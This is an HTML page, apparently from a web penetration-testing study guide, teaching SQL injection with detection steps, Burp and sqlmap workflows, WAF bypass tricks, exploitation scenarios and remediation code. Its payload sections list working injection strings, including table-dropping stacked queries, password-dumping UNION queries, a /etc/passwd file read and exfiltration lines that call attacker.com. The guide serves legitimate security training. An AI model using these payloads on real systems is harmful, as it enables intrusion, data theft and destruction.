@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SQL injection testing guide: detection, exploitation, and remediation. Covers blind SQLi, time-based, UNION attacks, and Burp Suite workflow.">
+    <meta property="og:title" content="SQL Injection – Web App Pentesting Guide">
+    <meta property="og:description" content="SQL injection testing guide: detection, exploitation, and remediation. Covers blind SQLi, time-based, UNION attacks, and Burp Suite workflow.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>SQL Injection  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">SQL Injection</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 9.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5v14c0 1.66 4.03 3 9 3s9-1.34 9-3V5"/><path d="M3 12c0 1.66 4.03 3 9 3s9-1.34 9-3"/></svg></span><span>SQL Injection</span></h1>
+      <p>Execute arbitrary SQL commands by breaking out of a query and injecting malicious code.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Intermediate</span>
+      </div>
+    </div>
+
+    <!-- ═══ ANALOGY ═══ -->
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">Bouncer Check-In</div>
+        <p>Imagine a nightclub bouncer checking a guest list. When you arrive, you say your name. The bouncer checks: "Is 'Alice' on the list?" If yes, you enter. But what if you say: "Alice OR everyone is approved"? The bouncer reads it as: "Is 'Alice' on the list OR is everyone on the list?"  · the second part is always true, so you get in without being on the actual list. SQL injection works exactly the same way: you add logic that makes the condition always true, bypassing security.</p>
+      </div>
+    </section>
+
+    <!-- ═══ METHODOLOGY ═══ -->
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill probe"><span class="day-num">Day 2</span>Initial Probe</div>
+      <div class="day-pill"><span class="day-num">Day 3</span>File / CSRF</div>
+      <div class="day-pill deep"><span class="day-num">Day 4</span>Deep Dive</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-probe">
+      <div class="callout-title">⚡ Day 2  · Initial Probe (Don't Go Deep Yet)</div>
+      <p>On Day 2, send a single quote <code>'</code> to every parameter you can find  · URL params, POST body, JSON fields, HTTP headers (User-Agent, Referer, X-Forwarded-For), cookie values, search boxes, login forms. You're looking for a signal: an SQL error message, a 500 response, or a noticeably different response. <strong>Mark it, document the request number in Burp, and move on.</strong> Do not spend more than a minute per parameter on Day 2.</p>
+      <p>Input probes to send on Day 2:</p>
+      <pre><code>'                          → SQL error? 500 response?
+1 AND 1=1                  → compare with: 1 AND 1=2
+1' AND SLEEP(5)-- -        → does the response take 5s longer?</code></pre>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 4  · Deep Dive (Full Exploitation)</div>
+      <p>Return to every parameter flagged on Day 2. Now go full depth: determine the injection type (error-based, union, blind boolean, blind time), enumerate the database structure, and extract data. Use sqlmap for confirmed injection points. Always try OOB (out-of-band) if blind: use Burp Collaborator or interactsh to confirm via DNS lookup.</p>
+      <pre><code># Confirmed SQLi  · full automation
+sqlmap -r request.txt --level 5 --risk 3 --batch --dbs
+
+# OOB via DNS (MSSQL)
+'; EXEC master..xp_dirtree '\\YOUR.interactsh.com\a'-- -
+
+# OOB (Oracle)
+'||(SELECT UTL_HTTP.REQUEST('http://YOUR.interactsh.com/'||user) FROM dual)||'</code></pre>
+      <p><strong>Chain it:</strong> SQLi with file-read privilege → read app config → find hardcoded creds. SQLi on MSSQL with xp_cmdshell → RCE.</p>
+    </div>
+
+    <!-- ═══ HOW IT WORKS ═══ -->
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>SQL injection occurs when user input is concatenated directly into a SQL query without proper parameterization. The database interprets the injected text as valid SQL commands, allowing an attacker to read, modify, or delete data.</p>
+
+      <h3>Vulnerable Code Example</h3>
+      <pre><code># Python (vulnerable  · DO NOT USE)
+username = request.args.get('user')
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+result = db.execute(query)</code></pre>
+
+      <p>If an attacker submits <code>admin' --</code> as the username, the query becomes:</p>
+      <pre><code>SELECT * FROM users WHERE username = 'admin' --'</code></pre>
+
+      <p>The <code>--</code> comments out the rest of the query, including the final quote, bypassing authentication.</p>
+
+      <h3>Why It's Dangerous</h3>
+      <p>SQL injection provides direct access to the database. An attacker can:</p>
+      <ul>
+        <li>Extract sensitive data (passwords, personal information, API keys)</li>
+        <li>Modify or delete records</li>
+        <li>Bypass authentication and authorization checks</li>
+        <li>Escalate privileges in the database</li>
+        <li>In some cases, execute operating system commands on the database server</li>
+      </ul>
+    </section>
+
+    <!-- ═══ WHERE TO LOOK ═══ -->
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Test any endpoint that accepts user input and communicates with a database. SQL injection isn't limited to GET parameters  · it hides in many places:</p>
+
+      <h3>Common Injection Points</h3>
+      <ul>
+        <li><strong>Login Forms:</strong> Username and password fields (authentication bypass)</li>
+        <li><strong>Search Boxes:</strong> Product search, user search, content filtering</li>
+        <li><strong>Sorting/Ordering:</strong> The <code>sort</code> or <code>order</code> parameter</li>
+        <li><strong>Filter Parameters:</strong> Date ranges, price ranges, status filters</li>
+        <li><strong>JSON Request Bodies:</strong> API endpoints accepting JSON (often overlooked)</li>
+        <li><strong>HTTP Headers:</strong> <code>User-Agent</code>, <code>X-Forwarded-For</code>, <code>Referer</code>, <code>X-Original-IP</code></li>
+        <li><strong>Cookies:</strong> Session cookies, tracking cookies, authentication tokens</li>
+        <li><strong>File Upload Names:</strong> Filename parameter in upload forms</li>
+      </ul>
+
+      <h3>What to Look For in Responses</h3>
+      <ul>
+        <li><strong>Error Messages:</strong> SQL syntax errors revealing table/column names: "Unexpected token near 'WHERE'"</li>
+        <li><strong>Timing Differences:</strong> Response takes 5+ seconds longer with <code>SLEEP(5)</code> injected</li>
+        <li><strong>Data Changes:</strong> Boolean responses (valid/invalid user) differ based on true/false condition</li>
+        <li><strong>Out-of-Band Channels:</strong> DNS queries or HTTP requests triggered by injected code</li>
+      </ul>
+    </section>
+
+    <!-- ═══ BURP WORKFLOW ═══ -->
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Capture the Request</strong>
+          <p>Use Burp Proxy (listening on 127.0.0.1:8080) to intercept HTTP requests. Right-click on a request and send it to Repeater. Target any input parameter (GET, POST, headers, JSON body).</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Test for SQLi Syntax</strong>
+          <p>In Repeater, modify the parameter with a single quote: <code>test'</code>. Send the request. Look for SQL syntax errors in the response. Example error: "SQL error: Unterminated string literal"  · this confirms the input reaches SQL.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Craft a Working Payload</strong>
+          <p>Try logical operators: <code>test' OR '1'='1</code>. If the response changes (returns data when it shouldn't, or doesn't filter), the injection works. Test with both <code>--</code> and <code>#</code> for comment syntax to close the query.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Identify Injection Type</strong>
+          <p>Determine if the database shows errors (error-based), has exploitable true/false responses (blind boolean), takes longer with delays (blind time-based), or responds out-of-band (DNS exfiltration).</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Use SQLMap for Automation</strong>
+          <p>Once confirmed, use sqlmap to automate extraction. Save the request from Burp (right-click → Copy to file) and run: <code>sqlmap -r request.txt --dbs --batch</code></p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Enumerate and Extract</strong>
+          <p>Use sqlmap to list tables (<code>--tables</code>), dump specific tables (<code>-T users --dump</code>), or escalate privileges. Save findings for the report.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOADS & TECHNIQUES ═══ -->
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Authentication Bypass</h3>
+      <p>Login forms are the easiest target. The query often looks like:</p>
+      <pre><code>SELECT * FROM users WHERE username='INPUT1' AND password='INPUT2'</code></pre>
+
+      <p>Inject in the username field:</p>
+      <pre><code>' OR '1'='1' --
+admin' --
+admin' #
+admin' OR 1=1 --
+' OR 'x'='x</code></pre>
+
+      <p>The query becomes: <code>SELECT * FROM users WHERE username='admin' --' AND password='...'</code>  · the condition is always true, and the password check is ignored.</p>
+
+      <h3>UNION-Based Injection</h3>
+      <p>Extract data directly from visible query results. First, determine the number of columns:</p>
+      <pre><code>' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+(repeat until you get an error)</code></pre>
+
+      <p>Once you know the column count (e.g., 3 columns), use UNION:</p>
+      <pre><code>' UNION SELECT 1,2,3 --
+' UNION SELECT 1,2,database() --
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT 1,2,group_concat(CONCAT(username,':',password)) FROM users --</code></pre>
+
+      <h3>Error-Based Injection</h3>
+      <p>Force errors to leak information in error messages:</p>
+      <pre><code>' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS CHAR) --
+' AND EXTRACTVALUE(1,CONCAT('~',(SELECT database()))) --
+' OR 1=CAST((SELECT version()) AS UNSIGNED) --</code></pre>
+
+      <h3>Blind Boolean-Based Injection</h3>
+      <p>No visible data returned, but behavior differs based on true/false conditions:</p>
+      <pre><code>' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a' --
+' AND SLEEP(0) --  (fast response = true)
+' AND SLEEP(5) --  (slow response = false)</code></pre>
+
+      <h3>Blind Time-Based Injection</h3>
+      <p>Inject delay functions; response time indicates true/false:</p>
+      <pre><code>MySQL:    ' OR SLEEP(5) --
+PostgreSQL: ' OR pg_sleep(5) --
+MSSQL:     ' WAITFOR DELAY '00:00:05' --
+Oracle:    ' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual) --</code></pre>
+
+      <p>To extract data one character at a time:</p>
+      <pre><code>' OR IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --</code></pre>
+
+      <h3>Stacked Queries (MSSQL, PostgreSQL)</h3>
+      <p>Some databases allow multiple SQL statements separated by semicolons:</p>
+      <pre><code>'; DROP TABLE users; --
+'; UPDATE users SET admin=1 WHERE username='attacker'; --</code></pre>
+
+      <h3>Out-of-Band Exfiltration (DNS)</h3>
+      <p>Trigger DNS requests containing data. Requires setting up a DNS server you control or using Burp Collaborator:</p>
+      <pre><code>MySQL:     ' OR LOAD_FILE('\\\\attacker.com\\share\\test') --
+MSSQL:     '; EXEC xp_dirtree '\\attacker.com\share' --
+Oracle:    ' OR UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users)) --</code></pre>
+    </section>
+
+    <!-- ═══ CHECKLIST ═══ -->
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <strong>SQLi Test Cases</strong>
+          <span class="progress-mini">0/12</span>
+        </div>
+        <div class="progress-bar-wrap"><div class="progress-bar" style="width: 0%"></div></div>
+
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test all GET parameters with single quote (<code>'</code>)  · look for SQL errors</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test all POST parameters (form data) with single quote</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test JSON body parameters (if API endpoint) with single quote</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test HTTP headers (User-Agent, X-Forwarded-For, Referer) with <code>' OR '1'='1</code></label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test cookie values with single quote injection</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test login form with <code>admin' --</code> in username field</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>If error-based: extract database version, current user, database name</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>If union-based: identify column count, extract table/column names, dump sensitive tables</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>If blind boolean: confirm injectable parameter by observing true/false responses</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>If blind time-based: confirm SQLi using SLEEP() delays and extract data</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Test second-order SQLi by injecting payload in a field, then viewing it in another place</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox">
+          <label>Run sqlmap with <code>--level 5 --risk 3</code> for comprehensive automated testing</label>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ WAF BYPASS ═══ -->
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Comment Variations</h3>
+      <p>Different comment syntaxes bypass filters checking for <code>--</code>:</p>
+      <pre><code>-- (SQL standard, but MSSQL/MySQL require space after)
+-- -  (space and dash)
+#    (MySQL comment)
+/**/  (C-style comment)
+/*!50000 ... */  (MySQL version-specific comment)</code></pre>
+
+      <h3>Case Mixing</h3>
+      <p>Some WAFs match exact case:</p>
+      <pre><code>' OR '1'='1
+' Or '1'='1
+' oR '1'='1
+' OR 1=1 --
+' or 1=1 #</code></pre>
+
+      <h3>Whitespace and Encoding</h3>
+      <pre><code>%20 (URL-encoded space)
+%09 (tab)
+%0A (newline)
+' OR(1=1)--
+'OR(1)--</code></pre>
+
+      <h3>Keyword Splitting</h3>
+      <p>Inject keywords with interrupting characters, then use comments to remove them:</p>
+      <pre><code>' /*!50000OR*/ '1'='1
+' UNI/**/ON SELECT
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --</code></pre>
+
+      <h3>Double Encoding</h3>
+      <p>If the app decodes twice:</p>
+      <pre><code>%252527  (URL-encoded '%27' which decodes to single quote)</code></pre>
+
+      <h3>MySQL-Specific Tricks</h3>
+      <pre><code>' UNION SELECT 1,2,3 LIMIT 1 OFFSET 0 --
+' UNION SELECT 1,2,@@version --  (get version)
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --</code></pre>
+
+      <h3>String Concatenation</h3>
+      <p>Break up dangerous keywords:</p>
+      <pre><code>MySQL:     CONCAT('SEL','ECT')
+MSSQL:     'SEL'+'ECT'
+Oracle:    'SEL'||'ECT'
+PostgreSQL: 'SEL'||'ECT'</code></pre>
+    </section>
+
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>SQLMap Command Reference</h3>
+      <p>Once you've confirmed SQLi, use sqlmap for efficient exploitation:</p>
+
+      <h4>Extract Databases</h4>
+      <pre><code>sqlmap -u "http://target.com/page.php?id=1" --dbs --batch</code></pre>
+
+      <h4>Dump Specific Database Tables</h4>
+      <pre><code>sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump</code></pre>
+
+      <h4>Extract All Data</h4>
+      <pre><code>sqlmap -u "http://target.com/page.php?id=1" --dump-all --batch</code></pre>
+
+      <h4>From Request File (Burp Export)</h4>
+      <pre><code>sqlmap -r request.txt --dbs --batch
+sqlmap -r request.txt --level 5 --risk 3 --dump-all</code></pre>
+
+      <h4>Test Specific Parameter</h4>
+      <pre><code>sqlmap -u "http://target.com/page.php?id=1&name=test" -p name --dbs</code></pre>
+
+      <h3>Real-World Exploitation Scenarios</h3>
+
+      <div class="finding-card">
+        <h4>Scenario 1: Extract User Credentials</h4>
+        <p>A vulnerable login form leaks usernames and password hashes. Extract the <code>users</code> table and crack hashes offline using Hashcat.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 2: Authentication Bypass</h4>
+        <p>Use <code>admin' --</code> to bypass login without knowing the password. Access admin panel and modify user roles, delete accounts, or escalate privileges.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 3: Data Exfiltration</h4>
+        <p>Dump all customer records (names, emails, phone numbers, payment info). Sell data or use for phishing campaigns.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 4: Write a Web Shell</h4>
+        <p>On MySQL with <code>FILE</code> privileges, use <code>INTO OUTFILE</code> to write PHP files to the web directory. Access the shell for remote code execution.</p>
+      </div>
+
+      <div class="finding-card">
+        <h4>Scenario 5: Privilege Escalation in Database</h4>
+        <p>Extract or reset database user passwords to gain administrative access. Backup the database or modify system tables for persistence.</p>
+      </div>
+    </section>
+
+    <!-- ═══ REMEDIATION ═══ -->
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>Parameterized Queries (Prepared Statements)</h3>
+      <p>The gold standard. Separates SQL code from user data, preventing injection:</p>
+
+      <h4>Python (sqlite3)</h4>
+      <pre><code>import sqlite3
+conn = sqlite3.connect('database.db')
+cursor = conn.cursor()
+
+# VULNERABLE
+username = request.args.get('user')
+cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+
+# SAFE - Use placeholders
+username = request.args.get('user')
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+result = cursor.fetchall()</code></pre>
+
+      <h4>Python (psycopg2 for PostgreSQL)</h4>
+      <pre><code>import psycopg2
+conn = psycopg2.connect("dbname=mydb user=myuser")
+cursor = conn.cursor()
+
+# SAFE
+username = request.args.get('user')
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+result = cursor.fetchall()</code></pre>
+
+      <h4>PHP (PDO)</h4>
+      <pre><code>$pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');
+
+// VULNERABLE
+$username = $_GET['user'];
+$stmt = $pdo->query("SELECT * FROM users WHERE username = '$username'");
+
+// SAFE - Use prepared statements
+$username = $_GET['user'];
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
+$stmt->execute([$username]);
+$result = $stmt->fetchAll();</code></pre>
+
+      <h4>Java (JDBC PreparedStatement)</h4>
+      <pre><code>String username = request.getParameter("user");
+
+// VULNERABLE
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+
+// SAFE
+String query = "SELECT * FROM users WHERE username = ?";
+PreparedStatement pstmt = connection.prepareStatement(query);
+pstmt.setString(1, username);
+ResultSet rs = pstmt.executeQuery();</code></pre>
+
+      <h3>Input Validation</h3>
+      <p>Validate and sanitize input before use:</p>
+      <ul>
+        <li><strong>Whitelist:</strong> Only allow known-good characters (e.g., usernames as alphanumeric only)</li>
+        <li><strong>Type Checking:</strong> Ensure IDs are integers, emails match a pattern</li>
+        <li><strong>Length Limits:</strong> Enforce maximum input length</li>
+        <li><strong>Reject Suspicious Patterns:</strong> Block inputs containing <code>' OR -- # /*</code></li>
+      </ul>
+
+      <h3>Principle of Least Privilege</h3>
+      <p>Database users should have minimal required permissions:</p>
+      <ul>
+        <li>Web application user: SELECT, INSERT, UPDATE (no DROP, no FILE access)</li>
+        <li>Admin/backup user: Full permissions, used only for maintenance</li>
+        <li>Read-only user: SELECT only, for reporting or analytics</li>
+      </ul>
+
+      <h3>Web Application Firewall (WAF)</h3>
+      <p>Use WAF rules to detect and block common SQLi patterns (ModSecurity, Cloudflare, AWS WAF). Layer with parameterized queries  · WAF alone is insufficient.</p>
+
+      <h3>Security Testing</h3>
+      <ul>
+        <li>Include SQLi testing in your CI/CD pipeline with tools like sqlmap</li>
+        <li>Perform code reviews focusing on database query construction</li>
+        <li>Run static analysis tools (SAST) that flag unsanitized user input in queries</li>
+      </ul>
+    </section>
+
+    <!-- ═══ PORTSWIGGER LABS ═══ -->
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>PortSwigger Academy provides 18 SQL injection labs across three difficulty levels:</p>
+
+      <h3>Apprentice (Beginner)</h3>
+      <ul>
+        <li><strong>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:</strong> Basic UNION-based SQLi to extract data from another table</li>
+        <li><strong>SQL injection vulnerability allowing login bypass:</strong> Bypass login with <code>admin' --</code></li>
+        <li><strong>SQL injection UNION attack, determining the number of columns returned by the query:</strong> Use ORDER BY to find column count, then UNION</li>
+        <li><strong>SQL injection UNION attack, finding a column containing text:</strong> Identify which column can return string data</li>
+        <li><strong>SQL injection UNION attack with a database table in a different database:</strong> Extract from information_schema or other databases</li>
+      </ul>
+
+      <h3>Practitioner (Intermediate)</h3>
+      <ul>
+        <li><strong>SQL injection vulnerability in the WHERE clause allowing conditional retrieval of hidden data:</strong> Blind boolean-based SQLi</li>
+        <li><strong>Blind SQL injection with conditional responses:</strong> Extract data using IF conditions</li>
+        <li><strong>Blind SQL injection with time delays:</strong> Use SLEEP() or equivalent to confirm blind SQLi</li>
+        <li><strong>Blind SQL injection with time delays and information retrieval:</strong> Extract data character-by-character with timing</li>
+        <li><strong>Blind SQL injection with conditional errors:</strong> Trigger errors to leak information</li>
+        <li><strong>Extracting sensitive data via SQL error messages:</strong> Use CAST() or other functions to force detailed errors</li>
+      </ul>
+
+      <h3>Expert (Advanced)</h3>
+      <ul>
+        <li><strong>Second-order SQL injection:</strong> Inject in one field, trigger execution in another request</li>
+        <li><strong>SQL injection in different parts of the query:</strong> Injections in SELECT, INSERT, UPDATE, DELETE statements</li>
+        <li><strong>Stacked queries:</strong> Execute multiple SQL statements (MSSQL/PostgreSQL)</li>
+        <li><strong>Time-based blind SQL injection  · character-by-character extraction:</strong> Automate data exfiltration</li>
+        <li><strong>Out-of-band (OAST) data exfiltration:</strong> Use DNS or HTTP callbacks to extract data</li>
+        <li><strong>SQL injection with filter evasion:</strong> Bypass WAF rules and input sanitization</li>
+      </ul>
+    </section>
+
+    <!-- ═══ COMMON MISTAKES ═══ -->
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #1: Only Testing GET Parameters</div>
+        <p>Beginners often test only URL parameters and forget POST bodies, JSON APIs, headers, and cookies. SQLi exists everywhere user input reaches SQL. Always test ALL input channels.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #2: Forgetting JSON Body Parameters</div>
+        <p>Modern APIs accept JSON in request bodies. Many testers overlook these. Use Burp Repeater to test JSON fields with SQL payloads. Example: <code>{"username": "' OR '1'='1", "password": "test"}</code></p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #3: Not Trying Different Comment Syntaxes</div>
+        <p>A payload with <code>--</code> might fail, but <code>#</code> works. Try both <code>--</code>, <code>#</code>, and <code>/**/</code>. Also try <code>-- -</code> (with a space after dashes).</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #4: Giving Up After First Failure</div>
+        <p>A single quote might not trigger an error. Try: <code>' OR '1'='1</code>, then <code>") OR ("1"="1</code>, then <code>) OR (1=1</code>. Different quotes and escaping levels exist. Persist.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #5: Ignoring Second-Order SQLi</div>
+        <p>Your payload doesn't execute immediately  · it's stored and executed when an admin views it. Inject in comment fields, profile names, etc. Then wait for a privileged user to trigger the payload.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #6: Testing Only String Inputs</div>
+        <p>Numeric parameters (IDs, ages, prices) are also injectable. Try: <code>?id=1' OR '1'='1</code> and <code>?id=1 OR 1=1 --</code> (without quotes). The query might not use quotes around the number.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #7: Running sqlmap Without Understanding the Result</div>
+        <p>sqlmap is powerful but blindly running it might miss vulnerable parameters or misidentify the database type. Always manually confirm SQLi first, then use sqlmap to automate extraction.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #8: Not Checking HTTP Headers</div>
+        <p>User-Agent, X-Forwarded-For, Referer, and custom headers often reach SQL queries (for logging, IP blocking, etc.). Include them in your testing strategy.</p>
+      </div>
+    </section>
+
+    <!-- ═══ SEE ALSO ═══ -->
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>SQL Injection is often chained with other vulnerabilities or found in apps that have related issues.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="cmdi.html">
+        <span class="sa-icon">💻</span>
+        <span class="sa-name">Command Injection</span>
+        <span class="sa-why">MSSQL xp_cmdshell turns SQLi into RCE. Same root cause: unsanitized input in a query.</span>
+      </a>
+      <a class="see-also-card" href="ssti.html">
+        <span class="sa-icon">📝</span>
+        <span class="sa-name">SSTI</span>
+        <span class="sa-why">Both are injection vulnerabilities. Apps vulnerable to SQLi often have loose input handling elsewhere.</span>
+      </a>
+      <a class="see-also-card" href="idor.html">
+        <span class="sa-icon">🚪</span>
+        <span class="sa-name">IDOR</span>
+        <span class="sa-why">SQLi gives DB access; IDOR gives object access. Together they expose all data in the system.</span>
+      </a>
+      <a class="see-also-card" href="nosqli.html">
+        <span class="sa-icon">🍃</span>
+        <span class="sa-name">NoSQL Injection</span>
+        <span class="sa-why">Same concept, different database. If you find SQLi, check if any endpoints use a NoSQL DB too.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// Copy button functionality
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+
+// Active sidebar navigation on scroll
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
